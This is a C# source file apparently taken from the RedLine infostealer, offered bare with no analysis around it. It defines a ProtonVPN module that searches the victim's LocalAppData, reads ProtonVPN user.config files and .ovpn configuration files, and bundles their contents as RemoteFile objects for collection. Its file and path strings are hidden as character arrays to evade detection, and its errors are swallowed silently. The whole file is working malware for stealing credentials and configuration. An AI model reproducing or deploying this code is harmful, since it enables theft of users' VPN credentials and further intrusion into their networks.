using System.Collections.Generic;
using System.IO;
using RedLine.Reburn.Data.Helpers;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Applications;

public static class ProtonVPN
{
	public static List<RemoteFile> ParseFiles()
	{
		List<RemoteFile> list = new List<RemoteFile>();
		try
		{
			string path = Path.Combine(Constants.LocalAppData, new string(new char[9] { 'P', 'r', 'o', 't', 'o', 'n', 'V', 'P', 'N' }));
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (text.Contains(new string(new char[13]
					{
						'P', 'r', 'o', 't', 'o', 'n', 'V', 'P', 'N', '.',
						'e', 'x', 'e'
					})))
					{
						string[] directories2 = Directory.GetDirectories(text);
						for (int j = 0; j < directories2.Length; j++)
						{
							string path2 = directories2[j] + new string(new char[12]
							{
								'\\', 'u', 's', 'e', 'r', '.', 'c', 'o', 'n', 'f',
								'i', 'g'
							});
							string name = new DirectoryInfo(Path.GetDirectoryName(path2)).Name;
							list.Add(new RemoteFile
							{
								Body = File.ReadAllBytes(path2),
								FileName = new string(new char[11]
								{
									'u', 's', 'e', 'r', '.', 'c', 'o', 'n', 'f', 'i',
									'g'
								}),
								FileDirectory = name
							});
						}
					}
				}
				directories = Directory.GetFiles(path);
				foreach (string path3 in directories)
				{
					if (Path.GetExtension(path3)!.Contains(new string(new char[4] { 'o', 'v', 'p', 'n' })))
					{
						list.Add(new RemoteFile
						{
							Body = File.ReadAllBytes(path3),
							FileName = Path.GetFileName(path3)
						});
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}
		catch
		{
			return list;
		}
	}
}
